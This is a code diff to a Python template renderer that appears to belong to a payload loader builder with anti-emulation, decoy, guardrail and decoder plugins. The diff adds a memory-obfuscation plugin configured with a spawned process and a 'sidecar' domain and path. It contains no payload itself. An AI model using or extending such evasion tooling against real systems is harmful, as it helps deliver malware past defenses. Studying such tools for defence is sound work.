@@ -37,7 +37,7 @@ def create_c_from_template(settings: Settings, payload_len: int):
 
     # copy *.c *.h files from src directory to dst directory
     for file in os.listdir(src):
-        if file.endswith(".c") or file.endswith(".h"):
+        if file.endswith(".c") or file.endswith(".h") or file.endswith(".res"):
             logger.debug("    Copy {} to {}".format(src + file, dst))
             shutil.copy2(src + file, dst)
 
@@ -51,6 +51,9 @@ def create_c_from_template(settings: Settings, payload_len: int):
         settings.carrier_invoke_style.value))
     logger.info("    Use AntiEmulation: {}".format(
         settings.plugin_antiemulation)
+    )
+    logger.info("    Use MemoryObfuscation: {}".format(
+        settings.plugin_memoryobfuscation)
     )
     if settings.dllfunc:
         logger.info("    DLL Function: {}".format(
@@ -122,6 +125,21 @@ def create_c_from_template(settings: Settings, payload_len: int):
             'SIR_ITERATION_COUNT': sir_iteration_count,
         })
 
+
+    # Plugin: MemoryObfuscation
+    filepath_memoryobfuscation = PATH_MEMORYOBFUSCATION + "{}.c".format(
+        settings.plugin_memoryobfuscation)
+    with open(filepath_memoryobfuscation, "r", encoding='utf-8') as file:
+         process_spawn = settings.process_spawn
+         sidecar_domain = settings.sidecar_domain
+         sidecar_path = settings.sidecar_path
+         plugin_memoryobfuscation = file.read()
+         plugin_memoryobfuscation = Template(plugin_memoryobfuscation).render({
+             'PROCESS_SPAWN': process_spawn,
+             'SIDECAR_DOMAIN': sidecar_domain,
+             'SIDECAR_PATH': sidecar_path,
+         })
+
     # Plugin: Decoy
     filepath_decoy = PATH_DECOY + "{}.c".format(
         settings.plugin_decoy)
@@ -138,6 +156,7 @@ def create_c_from_template(settings: Settings, payload_len: int):
     rendered_template = template.render({
         'plugin_decoder': plugin_decoder,
         'plugin_antiemulation': plugin_antiemualation,
+        'plugin_memoryobfuscation': plugin_memoryobfuscation,
         'plugin_decoy': plugin_decoy,
         'plugin_executionguardrail': plugin_guardrails,
         'PAYLOAD_LEN': payload_len,
